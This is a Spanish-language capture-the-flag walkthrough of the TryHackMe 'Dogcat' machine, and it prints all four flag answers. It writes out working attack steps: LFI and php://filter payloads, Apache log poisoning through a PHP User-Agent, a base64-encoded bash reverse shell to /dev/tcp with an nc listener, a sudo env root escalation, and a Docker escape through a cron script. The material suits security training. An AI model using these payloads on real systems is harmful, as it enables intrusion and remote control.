# Dogcat

###### tags: `Try Hack Me` `Linux` `Hacking Web` `LFI` `Wrappers` `Log Poissoning` `sudo` `Docker Breakout`
________________________

### **FLAGS:** 
    - 1a Flag: THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
    - 2a Flag: THM{LF1_t0_RC3_aec3fb}
    - 3a Flag: THM{D1ff3r3nt_3nv1ronments_874112}
    - 4a Flag: THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}

________________________

### **USERS:**
    - 

________________________

### **ENUMERACIÓN**

1. Vemos si el host esta levantado y saber el SSOO (**Linux**: TTL <= 64)
<code>ping -c1 IP</code>

    ![](https://i.imgur.com/w1MgOwR.png)

2. Sabemos que hay una web. Escaneamos los puertos abiertos

    - Primero vemos si va muy lento el escaneo:
    <code>nmap -p- --open -T5 -v -n IP</code>
    
            -p-		Todos los puertos
            --open 	Mostrar solos puertos abiertos
            -T5		Modo más agresivo
            -v 		Modo verbose (reporta por pantalla)
            -n		No aplicar resolución DNS
        
    - Como va lento, lanzamos este otro comando:
    <code>nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP</code>
    
            -sS		Realizar un TCP SYN port scan
            --min-rate	Emitir al menos 5000 paquetes por segundo
            -Pn		No realizar Host Discovery

     - Va más rápido y encuentra los puertos 22 (SSH) y 80 (HTTP)

        ![](https://i.imgur.com/6ED9H35.png)

3. Obtenemos los servicios que corren en los puertos
<code>nmap -sC -sV -p22,80 IP</code>

    ![](https://i.imgur.com/AhrqYAH.png)

4. Nos centramos en el servidor web Apache. Lanzamos un whatweb para ver si usa algún CMS tipo Wordpress, pero vemos que no, es un Apache normal

    ![](https://i.imgur.com/COjIbmE.png)

5. Accedemos al portal web y vemos lo mismo con Wappalyzer. Vemos el código fuente de la página a ver si encontramos algo:

    ![](https://i.imgur.com/33s19DC.png)

6. Lanzamos un fuzzing con GoBuster
   
      <code>gobuster dir -u IP -w DICT -q -n -e</code>

        -u    	Target 
        -w     	Diccionario (/usr/share/wordlists/dirb/common.txt)
        -q		Silencioso, no muestra mensajes de estado           
        -n		No muestra códigos de estado        
        -e		Muestra URLs completas
        
    ![](https://i.imgur.com/YjFxXzg.png)

_______________________

### **Web Hacking**

Vemos en el source code que carga las imagenes de cats/IMAGE o dogs/IMAGE tras llamar a ?view=cat o ?view=dog. Si probamos a poner ?view=bb, nos dice que solo cat o dog:

![](https://i.imgur.com/UlXQAnm.png)

- Si ponemos?view=dog1, vemos un error, ya que el código tiene un include([PARAMETRO VIEW].php).

    ![](https://i.imgur.com/U1LdNHW.png)

- Por lo que parece, no hace un equals con cat/dog, solo un contains.

- Vemos los ficheros dog.php y cat.php:

    ![](https://i.imgur.com/3KAhZlj.png)

- Devuelve un michito o doggo aleatorio

- Probamos a introducir dog y cat con una LFI: <code>?view=dog/../cat</code>

    ![](https://i.imgur.com/JA7CY8g.png)

- Intentamos la LFI sobre otro fichero <code>?view=dog/../index</code>: 

    ![](https://i.imgur.com/gjdxwUj.png)

    - Si que parece funcionar, el error es porque redeclara la funcion index.php, ya que es la propia página cargandose a si misma.

- Probamos los [wrappers](https://gitlab.com/JoMC98/webvulnerabilities/-/blob/master/list/Wrappers.md) de base64:
    
    <code>?view=php://filter/convert.base64-encode/resource=dog</code>
    
    ![](https://i.imgur.com/Nf0b72z.png)

- Probamos el wrapper con index con el mismo mecanismo:

    <code>?view=php://filter/convert.base64-encode/resource=cat/../index</code>

    ![](https://i.imgur.com/5uq49lB.png)

    ![](https://i.imgur.com/DOIeVNh.png)

- Vemos el código. Hay un parámetro **ext** para indicar la extensión del fichero a cargar.

    ![](https://i.imgur.com/ItLGRpL.png)

- Probamos una LFI para cargar el /etc/passwd:

    <code>?ext=&view=dog/../../../../../etc/passwd</code>

    ![](https://i.imgur.com/Ve8J5qS.png)

_______________

### **LFI**

Vamos a explotar la LFI para encontrar acceso al sistema.

- Usamos las siguientes técnicas para enumerar IPs, puertos abiertos y procesos internos:

- Probamos el logpoissoning. Vemos que podemos leer el access.log de apache:

    <code>?ext=log&view=dog/../../../../../var/log/apache2/access</code>

    ![](https://i.imgur.com/GLhfZ1i.png)

- Probamos a inyectar un comando en el User-Agent:

    ![](https://i.imgur.com/wEAqEQz.png)

    ![](https://i.imgur.com/iQktTmY.png)

______________

### **GET A SHELL** 

Al intentar meter una shell reversa, no se la come por tema de comillas y tal. Usamos la técnica de codificado en b64:

- *B64SHELL* --> <code>echo -n "/bin/bash -l > /dev/tcp/IP/PORT 0<&1 2>&1" | base64</code>
    
    ![](https://i.imgur.com/l3NyhIx.png)
    
- Lanzamos el siguiente curl, introduciendo la B64SHELL en el user agent:
    
    <code>curl -s -H "User-Agent: <?php system('echo B64SHELL | base64 -d | bash'); ?>" IP</code>

    ![](https://i.imgur.com/y3n1l0t.png)


- Levantamos un puerto en escucha en nuestro Kali:

    <code>nc -lvp 8443</code>
    
    ![](https://i.imgur.com/OhyGOCd.png)

- Accedemos de nuevo al log de Apache por el navegador 

    ![](https://i.imgur.com/n8eio2X.png)

- Conseguimos una Shell en el servidor como el usuario www-data.
    
- Podemos configurar una shell interactiva escribiendo lo siguiente por la shell reversa:

    1. script /dev/null -c bash
    2. CTRL + Z
    3. stty raw -echo
    4. fg
    5. reset
    6. xterm
    7. export TERM=xterm
    8. export SHELL=bash
    9. stty -a
    10. stty rows *NumRows* columns *NumCols*
        
    *Obtenemos NumRows y NumCols con stty -a en otra terminal con la misma dimensión que la shell reversa*

____________________

### **USER FLAG**

Navegamos un poco por la máquina. En /var/www encontramos la 2a flag:

![](https://i.imgur.com/qhW81Ek.png)
    
<mark>Tenemos la 2a flag: **THM{LF1_t0_RC3_aec3fb}**</mark>

Lanzamos un comando find para encontrar más flags:

<code>find / 2> /dev/null | grep flag</code>
    
![](https://i.imgur.com/0k6dGcN.png)

<mark>Tenemos la 1a flag: **THM{Th1s_1s_N0t_4_Catdog_ab67edfa}**</mark>

_____________________

### **ROOT FLAG**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4). También podemos lanzar este [script](https://github.com/rebootuser/LinEnum) para enumerar el sistema.

1. En primer lugar, intentamos ver los privilegios de sudo del usuario www-data. Ejecutamos <code>sudo -l</code>.

    ![](https://i.imgur.com/Vyb3YEs.png)

    - Vemos que se puede ejecutar /usr/bin/env como sudo sin password. En este [enlace](https://gtfobins.github.io/gtfobins/env/#sudo) vemos como explotarlo:
    
    ![](https://i.imgur.com/WqIHzb7.png)

2. Lanzamos el comando <code>sudo /usr/bin/env /bin/bash</code>

    ![](https://i.imgur.com/MKimapy.png)

3. Hemos escalado privilegios. Buscamos la 3a flag con el mismo comando que antes: 

    ![](https://i.imgur.com/plOh7ey.png)

4. Vemos que en el directorio de root está la 3a:

    <mark>Tenemos la 3a flag: **THM{D1ff3r3nt_3nv1ronments_874112}**</mark>

_____________________

### **DOCKER FLAG**

Por la info de la máquina, sabemos que tenemos que salir de un docker. Además, viendo que no hay comandos básicos como ip o ifconfig, parece un container de docker.

- Rascando el servidor, vemos un directorio /opt/backups. Dentro hay un script, que genera tars, y uno de los tars:

    ![](https://i.imgur.com/zPZ9EUG.png)

- Por las fechas vemos que el script se ejecuta de forma cada minuto.

- Modificamos el script, añadiendo una Shell Reversa a otro puerto que nos levantamos.

- Conseguimos acceso como root en la máquina host:

    ![](https://i.imgur.com/RopP8Yk.png)

    <mark>Tenemos la 4a flag: **THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}**</mark>